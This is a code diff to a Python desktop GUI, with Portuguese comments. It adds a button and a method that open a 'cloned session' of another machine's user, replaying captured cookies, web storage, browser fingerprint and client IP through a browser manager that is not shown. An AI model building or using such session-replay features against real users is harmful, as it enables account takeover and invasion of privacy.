@@ -1836,6 +1836,42 @@ class MainWindow(ctk.CTk):
                 pady=2
             )
             status_badge.pack(side="right")
+            
+            # ✅ BOTÃO ABRIR SESSÃO
+            if is_active:
+                btn_frame = ctk.CTkFrame(content, fg_color="transparent")
+                btn_frame.pack(fill="x", pady=(10, 0))
+                
+                open_session_btn = ctk.CTkButton(
+                    btn_frame,
+                    text="🚀 Abrir Sessão",
+                    width=150,
+                    height=32,
+                    fg_color="#2563eb",
+                    hover_color="#1d4ed8",
+                    font=ctk.CTkFont(size=12, weight="bold"),
+                    command=lambda s=session: self.open_cloned_session(s)
+                )
+                open_session_btn.pack(side="left")
+                
+                # Indicador de dados disponíveis
+                cookies_count = len(session.get('cookies', []))
+                storage_count = len(session.get('local_storage', {}))
+                has_fingerprint = bool(session.get('browser_fingerprint'))
+                
+                data_info = f"📦 {cookies_count} cookies"
+                if storage_count > 0:
+                    data_info += f" · 💾 {storage_count} storage items"
+                if has_fingerprint:
+                    data_info += " · 🔍 fingerprint"
+                
+                info_label = ctk.CTkLabel(
+                    btn_frame,
+                    text=data_info,
+                    font=ctk.CTkFont(size=10),
+                    text_color="#94a3b8"
+                )
+                info_label.pack(side="left", padx=(15, 0))
         
         search_btn = ctk.CTkButton(
             search_frame,
@@ -1883,6 +1919,110 @@ class MainWindow(ctk.CTk):
             fg_color="#64748b",
             hover_color="#475569",
             font=ctk.CTkFont(size=13, weight="bold"),
+            command=dialog.destroy
+        ).pack()
+    
+    def open_cloned_session(self, session: Dict):
+        """
+        Abrir sessão clonada do usuário usando dados da tabela active_sessions
+        """
+        logger.info(f"🚀 Abrindo sessão clonada: {session['domain']}")
+        
+        try:
+            machine_id = session['machine_id']
+            url = session['url']
+            domain = session['domain']
+            
+            # Verificar se há dados suficientes
+            cookies = session.get('cookies', [])
+            if not cookies or len(cookies) == 0:
+                logger.warning("⚠️ Sessão sem cookies - não é possível clonar")
+                self.show_error_dialog(
+                    "Dados Insuficientes",
+                    "Esta sessão não possui cookies capturados.\nNão é possível clonar a sessão."
+                )
+                return
+            
+            logger.info(f"📦 Clonando com {len(cookies)} cookies")
+            
+            # Criar incident temporário para usar browser_manager
+            incident_data = {
+                'id': f"session-{machine_id}-{session['tab_id']}",
+                'machine_id': machine_id,
+                'tab_url': url,
+                'host': domain,
+                'client_ip': session.get('client_ip'),
+                'browser_fingerprint': session.get('browser_fingerprint', {}),
+                'full_cookie_data': cookies,
+                'local_storage': session.get('local_storage', {}),
+                'session_storage': session.get('session_storage', {})
+            }
+            
+            # Abrir browser com sessão clonada
+            def open_browser():
+                try:
+                    run_async(self.browser_manager.start_session(
+                        incident_id=incident_data['id'],
+                        machine_id=machine_id,
+                        url=url,
+                        cookies=cookies,
+                        local_storage=incident_data['local_storage'],
+                        session_storage=incident_data['session_storage'],
+                        fingerprint=incident_data['browser_fingerprint'],
+                        client_ip=incident_data['client_ip']
+                    ))
+                    logger.info("✅ Sessão clonada aberta com sucesso")
+                except Exception as e:
+                    logger.error(f"❌ Erro ao abrir sessão clonada: {e}", exc_info=True)
+                    self.safe_after(0, lambda: self.show_error_dialog(
+                        "Erro ao Abrir Sessão",
+                        f"Não foi possível abrir a sessão:\n{str(e)}"
+                    ))
+            
+            threading.Thread(target=open_browser, daemon=True).start()
+            
+        except Exception as e:
+            logger.error(f"❌ Erro ao preparar sessão clonada: {e}", exc_info=True)
+            self.show_error_dialog(
+                "Erro",
+                f"Erro ao abrir sessão:\n{str(e)}"
+            )
+    
+    def show_error_dialog(self, title: str, message: str):
+        """Mostrar diálogo de erro"""
+        dialog = ctk.CTkToplevel(self)
+        dialog.title(title)
+        dialog.geometry("400x200")
+        dialog.transient(self)
+        dialog.grab_set()
+        
+        # Centralizar
+        dialog.update_idletasks()
+        x = (dialog.winfo_screenwidth() // 2) - 200
+        y = (dialog.winfo_screenheight() // 2) - 100
+        dialog.geometry(f"400x200+{x}+{y}")
+        
+        # Conteúdo
+        frame = ctk.CTkFrame(dialog, fg_color="transparent")
+        frame.pack(fill="both", expand=True, padx=20, pady=20)
+        
+        ctk.CTkLabel(
+            frame,
+            text="⚠️",
+            font=ctk.CTkFont(size=32)
+        ).pack(pady=(10, 10))
+        
+        ctk.CTkLabel(
+            frame,
+            text=message,
+            font=ctk.CTkFont(size=12),
+            wraplength=350
+        ).pack(pady=(0, 20))
+        
+        ctk.CTkButton(
+            frame,
+            text="OK",
+            width=100,
             command=dialog.destroy
         ).pack()
     
